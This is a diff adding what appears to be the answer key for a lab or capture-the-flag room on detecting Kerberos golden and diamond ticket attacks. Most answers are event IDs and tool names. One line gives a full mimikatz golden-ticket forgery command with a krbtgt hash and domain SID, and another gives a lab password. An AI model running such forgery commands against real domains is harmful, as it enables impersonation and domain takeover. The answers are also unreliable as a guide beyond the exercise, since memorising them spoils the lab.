@@ -1,0 +1,18 @@
+1. No answer needed
+2. 1. krbtgt
+   2. Rubeus
+3. 1. 4769
+   2. 0x17
+4. 1. 4662
+   2. a.khan
+   3. .\mimikatz.exe "kerberos::golden /user:a.khan /domain:lunarbank.thm /sid:S-1-5-21-1966530601-3185510712-10604624 /krbtgt:05a72fbbb85187671860d69f62505c97 /ptt" "exit"
+   4. 8/7/2036 13:22:46
+5. 1. 4672
+   2. PAC
+6. 1. FinanceVault
+   2. AES-256-CTS-HMAC-SHA1-96
+   3. Administrator
+   4. Autumn2025!
+   5. Diamond
+7. No answer needed
+8. No answer needed
